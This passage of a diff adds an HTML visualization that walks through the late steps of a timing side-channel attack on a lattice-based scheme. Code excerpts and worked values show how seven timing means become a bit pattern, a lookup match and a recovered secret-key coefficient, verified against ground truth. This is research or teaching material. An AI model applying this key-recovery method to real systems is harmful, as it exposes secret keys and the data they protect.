+      <div class="label">Distance calculations + confidence check</div>
+      <table class="mtbl">
+        <tr><th>CT</th><th>Mean</th><th style="color:#3366cc">Dist to 0</th><th style="color:#cc6633">Dist to 1</th><th>Near</th><th>Pass?</th><th>m'</th></tr>
+        <tr>
+          <td>0</td><td>55.3</td>
+          <td><span class="val">134.1</span></td>
+          <td><span class="val">3.2</span></td>
+          <td>3.2</td><td><span class="val-g">3.2 &le; 41.2</span></td>
+          <td class="val-o"><strong>1</strong></td>
+        </tr>
+        <tr>
+          <td>1</td><td>192.7</td>
+          <td><span class="val">3.3</span></td>
+          <td><span class="val">140.6</span></td>
+          <td>3.3</td><td><span class="val-g">3.3 &le; 41.2</span></td>
+          <td class="val-b"><strong>0</strong></td>
+        </tr>
+        <tr>
+          <td>2</td><td>186.1</td>
+          <td><span class="val">3.3</span></td>
+          <td><span class="val">134.0</span></td>
+          <td>3.3</td><td><span class="val-g">&check;</span></td>
+          <td class="val-b"><strong>0</strong></td>
+        </tr>
+        <tr>
+          <td>3</td><td>191.4</td>
+          <td><span class="val">2.0</span></td>
+          <td><span class="val">139.3</span></td>
+          <td>2.0</td><td><span class="val-g">&check;</span></td>
+          <td class="val-b"><strong>0</strong></td>
+        </tr>
+        <tr>
+          <td>4</td><td>188.9</td>
+          <td><span class="val">0.5</span></td>
+          <td><span class="val">136.8</span></td>
+          <td>0.5</td><td><span class="val-g">&check;</span></td>
+          <td class="val-b"><strong>0</strong></td>
+        </tr>
+        <tr>
+          <td>5</td><td>48.7</td>
+          <td><span class="val">140.7</span></td>
+          <td><span class="val">3.4</span></td>
+          <td>3.4</td><td><span class="val-g">&check;</span></td>
+          <td class="val-o"><strong>1</strong></td>
+        </tr>
+        <tr>
+          <td>6</td><td>185.2</td>
+          <td><span class="val">4.2</span></td>
+          <td><span class="val">133.1</span></td>
+          <td>4.2</td><td><span class="val-g">&check;</span></td>
+          <td class="val-b"><strong>0</strong></td>
+        </tr>
+      </table>
+      <div class="produces">Produces: 7 individual m' classifications, feeds into Step 9</div>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 9: 7-bit Pattern -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-class">9</span> Form the 7-bit Pattern</div>
+    <div class="step-desc">
+      The 7 individual m' classifications combine into a <strong>7-bit pattern</strong>.
+      <br><br>
+      Each possible coefficient value (-3 to +3) produces a <strong>unique pattern</strong>. So the pattern directly identifies the coefficient.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">guess.h : 83-84</div>
+    <div class="code-block"><span class="cmt">// after classifying all 7 CTs:</span>
+m_guesses[] = {
+<span class="hl-line">  <span class="num">1</span>, <span class="num">0</span>, <span class="num">0</span>, <span class="num">0</span>, <span class="num">0</span>, <span class="num">1</span>, <span class="num">0</span></span>
+};
+
+<span class="cmt">// pass to guess_coefficient()</span></div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">7-bit pattern assembled <span class="ref">&larr; m' values from Step 8</span></div>
+      <div class="bits">
+        <div class="bit b1">1</div>
+        <div class="bit b0">0</div>
+        <div class="bit b0">0</div>
+        <div class="bit b0">0</div>
+        <div class="bit b0">0</div>
+        <div class="bit b1">1</div>
+        <div class="bit b0">0</div>
+      </div>
+      CT[0]=<span class="val-o">1</span>, CT[1]=<span class="val-b">0</span>, CT[2]=<span class="val-b">0</span>, CT[3]=<span class="val-b">0</span>, CT[4]=<span class="val-b">0</span>, CT[5]=<span class="val-o">1</span>, CT[6]=<span class="val-b">0</span>
+      <div class="produces">Produces: <span class="tag tag-p">P</span> pattern {1,0,0,0,0,1,0} &mdash; ready for lookup</div>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 10: Lookup Table Match -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-match">10</span> Lookup Table &rarr; Coefficient</div>
+    <div class="step-desc">
+      Scan the 7-row lookup table to find a matching pattern.
+      <br><br>
+      Each row corresponds to a coefficient value. The match at row <strong>i=4</strong> is then converted using the <strong>polarity formula</strong>:
+      <br><br>
+      For non-zero index positions: <code>coeff = 3 - i</code>
+      <br>
+      For index 0: <code>coeff = i - 3</code>
+      <br><br>
+      This accounts for the NTT transform's effect on sign.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">guess.h : 42-57</div>
+    <div class="code-block"><span class="type">uint8_t</span> patterns[<span class="num">7</span>][<span class="num">7</span>] = {
+  {<span class="num">0,0,1,0,1,0,1</span>}, <span class="cmt">// i=0</span>
+  {<span class="num">1,0,1,0,1,0,1</span>}, <span class="cmt">// i=1</span>
+  {<span class="num">1,0,0,0,1,0,1</span>}, <span class="cmt">// i=2</span>
+  {<span class="num">1,0,0,0,0,0,1</span>}, <span class="cmt">// i=3</span>
+<span class="hl-line">  {<span class="num">1,0,0,0,0,1,0</span>}, <span class="cmt">// i=4 MATCH</span></span>
+  {<span class="num">1,0,0,1,0,1,0</span>}, <span class="cmt">// i=5</span>
+  {<span class="num">1,1,0,1,0,1,0</span>}, <span class="cmt">// i=6</span>
+};
+
+<span class="kw">for</span> (<span class="kw">int</span> i = <span class="num">0</span>; i &lt; <span class="num">7</span>; i++) {
+  <span class="kw">if</span> (<span class="fn">memcmp</span>(m_guesses, patterns[i], <span class="num">7</span>) == <span class="num">0</span>)
+<span class="hl-line">    <span class="kw">return</span> (coeff_nb%<span class="num">256</span>) ? (<span class="num">3</span>-i) : (i-<span class="num">3</span>);</span>
+}</div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">Table scan <span class="ref">&larr; <span class="tag tag-p">P</span> pattern from Step 9</span></div>
+      <span class="calc-line">i=0: [0,0,1,0,1,0,1] &ne; [1,0,0,0,0,1,0] <span class="val-r">&times;</span></span>
+      <span class="calc-line">i=1: [1,0,1,0,1,0,1] &ne; [1,0,0,0,0,1,0] <span class="val-r">&times;</span></span>
+      <span class="calc-line">i=2: [1,0,0,0,1,0,1] &ne; [1,0,0,0,0,1,0] <span class="val-r">&times;</span></span>
+      <span class="calc-line">i=3: [1,0,0,0,0,0,1] &ne; [1,0,0,0,0,1,0] <span class="val-r">&times;</span></span>
+      <span class="calc-line">i=4: [1,0,0,0,0,1,0] == [1,0,0,0,0,1,0] <span class="val-g">MATCH!</span></span>
+    </div>
+    <div class="calc-box">
+      <div class="label">Polarity formula</div>
+      <span class="calc-line">Match at i = <span class="val">4</span></span>
+      <span class="calc-line">coeff_nb = 42</span>
+      <span class="calc-line">42 % 256 = 42 (non-zero &rarr; use <strong>3 - i</strong>)</span>
+      <span class="calc-group">coefficient = 3 - 4 = <span class="val-g">-1</span></span>
+      <span class="calc-group"><strong>s_guess = <span class="val-g">-1</span></strong></span>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 11: Confidence + Result -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-result">11</span> Confidence Check + Result</div>
+    <div class="step-desc">
+      Every 512 iterations, the guess is re-evaluated.
+      If it matches the previous guess, <strong>confidence increments</strong>.
+      If it changes, confidence resets to 0.
+      <br><br>
+      After <strong>20 consecutive stable evaluations</strong> (CONFIDENCE_HIGH), the guess is accepted with high certainty.
+      <br><br>
+      If 100,000 iterations pass without reaching confidence 5 (CONFIDENCE_MEH), the loop continues beyond the default limit until at least that minimum confidence is achieved.
+      <br><br>
+      This coefficient is done. The attack moves to <strong>s[43]</strong> and repeats the entire process.
+      After all 512 coefficients are recovered, the full secret key is known.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">attack.c : 175-185</div>
+    <div class="code-block"><span class="cmt">// confidence tracking</span>
+<span class="hl-line">confidence = (s_guess != DONT_KNOW)</span>
+<span class="hl-line">  && (s_last == s_guess)</span>
+<span class="hl-line">  ? confidence + <span class="num">1</span></span>
+<span class="hl-line">  : <span class="num">0</span>;</span>
+
+<span class="cmt">// loop condition:</span>
+<span class="hl-warm">((itx &lt; <span class="num">100000</span>) ||</span>
+<span class="hl-warm"> (confidence &lt; <span class="num">5</span>)) &&  <span class="cmt">// MEH</span></span>
+<span class="hl-warm">(confidence &lt; <span class="num">20</span>)       <span class="cmt">// HIGH</span></span></div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">Confidence building</div>
+      <span class="calc-line">Eval 1: guess=-1, prev=?? &rarr; conf=<span class="val">0</span> (changed)</span>
+      <span class="calc-line">Eval 2: guess=-1, prev=-1 &rarr; conf=<span class="val">1</span></span>
+      <span class="calc-line">Eval 3: guess=-1, prev=-1 &rarr; conf=<span class="val">2</span></span>
+      <span class="calc-line">...</span>
+      <span class="calc-line">Eval 5: guess=-1, prev=-1 &rarr; conf=<span class="val">5</span> <em style="color:#888">(MEH reached)</em></span>
+      <span class="calc-line">...</span>
+      <span class="calc-line">Eval 20: guess=-1, prev=-1 &rarr; conf=<span class="val">19</span></span>
+      <span class="calc-line">Eval 21: guess=-1, prev=-1 &rarr; conf=<span class="val-g">20 STOP!</span></span>
+      <span class="calc-group">20 &ge; CONFIDENCE_HIGH (20) &rarr; <strong>accept</strong></span>
+    </div>
+    <div class="calc-box" style="border-color:#00ff41">
+      <div class="label">Final verification <span class="ref">&larr; <span class="tag tag-s">S</span> ground truth from Step 2</span></div>
+      <div style="text-align:center;padding:8px 0">
+        s_guess = <span class="val-g" style="font-size:16px">-1</span>
+        <br>
+        s_truth = <span class="val-g" style="font-size:16px">-1</span> <span class="ref">&larr; <span class="tag tag-s">S</span> Step 2</span>
+        <br><br>
+        <span class="val-g" style="font-size:14px">CORRECT</span>
+      </div>
+      <div class="produces">
+        <span class="calc-line">Total iterations: <span class="val">14,849</span> (exited early)</span>
+        <span class="calc-line">Outliers discarded: <span class="val">1,949</span></span>
+        <span class="calc-line">Time for this coefficient: <span class="val">~1.2 seconds</span></span>
+        <span class="calc-group">Repeat for all 512 coefficients &rarr; full key in ~5-10 minutes</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Final summary -->
+<div style="padding:30px 16px">
+  <div class="result-banner">
+    <div style="font-size:12px;color:#888;letter-spacing:1px">DATA FLOW SUMMARY</div>
+    <div class="big">s[42] = -1 recovered</div>
+    <div style="font-size:12px;color:#999;line-height:1.8;max-width:600px;margin:10px auto">
+      <span class="tag tag-s">S</span> Secret generated in Step 2 &rarr; targeted by <span class="tag tag-ct">CT</span> ciphertexts from Step 3
+      &rarr; probed via <span class="tag tag-t">T</span> timing in Steps 4-6
+      &rarr; accumulated into <span class="tag tag-m">M</span> means in Step 7
+      &rarr; classified into <span class="tag tag-p">P</span> pattern in Steps 8-9
+      &rarr; matched to coefficient in Step 10
+      &rarr; verified against <span class="tag tag-s">S</span> truth in Step 11
+    </div>
+  </div>
+</div>
+
+</div><!-- end learn-container -->
+
+</body>
+</html>
